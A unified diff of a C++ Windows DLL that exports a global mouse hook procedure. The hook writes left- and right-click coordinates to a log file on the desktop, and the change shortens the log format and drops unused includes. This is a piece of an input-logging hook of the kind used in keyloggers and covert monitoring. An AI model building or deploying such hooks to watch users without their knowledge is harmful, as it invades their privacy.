@@ -1,13 +1,10 @@
 #include <windows.h>
-#include <stdio.h>
 #include <fstream>
 
 #include <shlobj.h> // Using SHGetKnownFolderPath
 #include <KnownFolders.h>
 #include <shlwapi.h> // Using PathCombine
 
-#include <iostream>
-#include <bitset>
 // Buffer to store the desktop folder path
 PWSTR desktopPath = nullptr;
 wchar_t filePath[MAX_PATH];
@@ -58,10 +55,10 @@ extern "C" __declspec(dllexport) LRESULT WINAPI procedureMouse(int nCode, WPARAM
 		MOUSEHOOKSTRUCT* data = (MOUSEHOOKSTRUCT*)lParam;
 
 		if (wParam == WM_LBUTTONDOWN) {
-			LogFile << "Left Mouse click: " << "x: " << data->pt.x << " y: " << data->pt.y << std::endl;
+			LogFile << std::endl << "LMB:(" << data->pt.x << "," << data->pt.y << ") ";
 		}
 		else if (wParam == WM_RBUTTONDOWN) {
-			LogFile << "Right Mouse click: " << "x: " << data->pt.x << " y: " << data->pt.y << std::endl;
+			LogFile << std::endl << "RMB:(" << data->pt.x << "," << data->pt.y << ") ";
 		}
 
 		// Close the file
@@ -69,9 +66,6 @@ extern "C" __declspec(dllexport) LRESULT WINAPI procedureMouse(int nCode, WPARAM
 	}
 	return CallNextHookEx(global, nCode, wParam, lParam);
 }
-
-
-
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
 {
